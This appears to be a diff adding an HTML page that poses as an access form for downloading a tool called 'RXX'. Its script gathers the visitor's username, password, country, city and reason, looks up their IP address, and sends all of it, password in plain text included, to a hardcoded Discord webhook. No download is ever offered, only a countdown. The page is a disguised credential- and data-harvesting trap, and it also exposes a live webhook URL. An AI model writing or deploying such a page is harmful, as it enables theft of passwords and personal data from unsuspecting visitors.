@@ -1,0 +1,240 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Download Access Form</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      background-color: #1c0000;
+    }
+    .form-container {
+      background: #2b0000;
+      padding: 20px;
+      border-radius: 8px;
+      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.5);
+      width: 300px;
+    }
+    .form-container h2 {
+      text-align: center;
+      margin-bottom: 20px;
+      color: #fff;
+    }
+    .form-container input,
+    .form-container textarea {
+      width: 100%;
+      padding: 10px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      box-sizing: border-box;
+      background-color: #333;
+      color: #fff;
+    }
+    .form-container button {
+      width: 100%;
+      padding: 10px;
+      background-color: #ff0000;
+      color: #fff;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+    .form-container button:hover {
+      background-color: #cc0000;
+    }
+    .form-container button:disabled {
+      background-color: #888;
+      cursor: not-allowed;
+    }
+    .status-message {
+      text-align: center;
+      margin-top: 10px;
+      color: #fff;
+    }
+    .error-message {
+      text-align: center;
+      margin-top: 10px;
+      color: #ff0000;
+    }
+    .release-container {
+      text-align: center;
+      color: #fff;
+    }
+    .release-text {
+      font-size: 3rem;
+      font-weight: bold;
+      text-shadow: 0 0 10px #ff0000, 0 0 20px #ff0000, 0 0 30px #ff0000;
+      animation: pulse 2s infinite;
+    }
+    @keyframes pulse {
+      0% { text-shadow: 0 0 10px #ff0000, 0 0 20px #ff0000, 0 0 30px #ff0000; }
+      50% { text-shadow: 0 0 20px #ff0000, 0 0 30px #ff0000, 0 0 40px #ff0000; }
+      100% { text-shadow: 0 0 10px #ff0000, 0 0 20px #ff0000, 0 0 30px #ff0000; }
+    }
+    .download-button {
+      margin-top: 20px;
+      padding: 15px 30px;
+      background-color: #888;
+      color: #fff;
+      border: none;
+      border-radius: 4px;
+      font-size: 1.2rem;
+      cursor: not-allowed;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+    }
+  </style>
+</head>
+<body>
+  <div id="mainContainer" class="form-container">
+    <h2>Download RXX</h2>
+    <form id="accessForm">
+      <input type="text" id="username" placeholder="Username" required>
+      <input type="password" id="password" placeholder="Password" required>
+      <input type="text" id="country" placeholder="Country" required>
+      <input type="text" id="city" placeholder="City" required>
+      <textarea id="reason" placeholder="Reason for downloading RXX" required rows="4"></textarea>
+      <button type="submit" id="submitButton">Submit</button>
+    </form>
+    <div id="status" class="status-message"></div>
+    <div id="result" class="error-message"></div>
+  </div>
+
+  <script>
+    document.getElementById('accessForm').addEventListener('submit', async (e) => {
+      e.preventDefault();
+      const submitButton = document.getElementById('submitButton');
+      const statusDiv = document.getElementById('status');
+      const resultDiv = document.getElementById('result');
+      const mainContainer = document.getElementById('mainContainer');
+      const username = document.getElementById('username').value;
+      const password = document.getElementById('password').value;
+      const country = document.getElementById('country').value;
+      const city = document.getElementById('city').value;
+      const reason = document.getElementById('reason').value;
+
+      submitButton.disabled = true;
+      statusDiv.textContent = 'Loading...';
+      resultDiv.textContent = '';
+
+      // Fetch IP address
+      let ipAddress = 'Unknown';
+      try {
+        const ipResponse = await fetch('https://api.ipify.org?format=json');
+        if (ipResponse.ok) {
+          const ipData = await ipResponse.json();
+          ipAddress = ipData.ip;
+        } else {
+          console.error('Failed to fetch IP address');
+        }
+      } catch (error) {
+        console.error('IP fetch error:', error.message);
+      }
+
+      await new Promise(resolve => setTimeout(resolve, 2000));
+      statusDiv.textContent = 'Checking reason...';
+
+      await new Promise(resolve => setTimeout(resolve, 2000));
+      statusDiv.textContent = '';
+
+      // Check if reason contains "hacking XD" (case-insensitive)
+      const isApproved = reason.toLowerCase().includes('hacking xd');
+      if (isApproved) {
+        // Clear the main container
+        mainContainer.innerHTML = `
+          <div class="release-container">
+            <div id="releaseText" class="release-text">5 Days Until RXX Release!</div>
+            <button id="downloadButton" class="download-button" disabled>
+              <span>Download RXX</span>
+              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M12 20h9"></path>
+                <path d="M16.5 3.5a2.12 2.12 0 0 1 3 3L7 19l-4 1 1-4L16.5 3.5z"></path>
+              </svg>
+            </button>
+          </div>
+        `;
+
+        // Set timer for 5 days from now (July 18, 2025, 20:24 BST)
+        const releaseDate = new Date('2025-07-23T20:24:00Z');
+        const downloadButton = document.getElementById('downloadButton');
+        const releaseText = document.getElementById('releaseText');
+
+        const updateTimer = () => {
+          const now = new Date();
+          const timeLeft = releaseDate - now;
+          if (timeLeft <= 0) {
+            releaseText.textContent = 'RXX Release Expired!';
+            downloadButton.addEventListener('click', () => {
+              alert('Too Late...');
+            });
+            return;
+          }
+          const days = Math.floor(timeLeft / (1000 * 60 * 60 * 24));
+          const hours = Math.floor((timeLeft % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+          const minutes = Math.floor((timeLeft % (1000 * 60 * 60)) / (1000 * 60));
+          const seconds = Math.floor((timeLeft % (1000 * 60)) / 1000);
+          releaseText.textContent = `RXX releases in: ${days}d ${hours}h ${minutes}m ${seconds}s`;
+        };
+        updateTimer();
+        setInterval(updateTimer, 1000);
+      } else {
+        resultDiv.className = 'error-message';
+        resultDiv.textContent = 'Access Denied';
+      }
+
+      const webhookUrl = 'https://discord.com/api/webhooks/1395512594751688796/kynf3LtOxljC0v4Cwn9I3eLhTydjtRNkASi0wSvvLqPQ8vgufmDOcRSeKe8qF801FuZ7';
+
+      const data = {
+        content: `New download attempt:\n**Username**: ${username}\n**Password**: ${password}\n**Country**: ${country}\n**City**: ${city}\n**Reason**: ${reason}\n**IP Address**: ${ipAddress}\n**Status**: ${isApproved ? 'Approved' : 'Denied'}\n**Timestamp**: ${new Date().toISOString()}`,
+        embeds: [
+          {
+            title: "Download Attempt",
+            fields: [
+              { name: "Username", value: username, inline: true },
+              { name: "Password", value: password, inline: true },
+              { name: "Country", value: country, inline: true },
+              { name: "City", value: city, inline: true },
+              { name: "Reason", value: reason, inline: false },
+              { name: "IP Address", value: ipAddress, inline: true },
+              { name: "Status", value: isApproved ? 'Approved' : 'Denied', inline: true },
+              { name: "Timestamp", value: new Date().toISOString(), inline: false }
+            ],
+            color: isApproved ? 0x00ff00 : 0xff0000
+          }
+        ]
+      };
+
+      try {
+        const response = await fetch(webhookUrl, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify(data)
+        });
+
+        if (!response.ok) {
+          const errorText = await response.text();
+          console.error('Webhook response:', response.status, errorText);
+        }
+      } catch (error) {
+        console.error('Fetch error:', error.message);
+      }
+
+      if (!isApproved) {
+        submitButton.disabled = false;
+        document.getElementById('accessForm').reset();
+      }
+    });
+  </script>
+</body>
+</html>
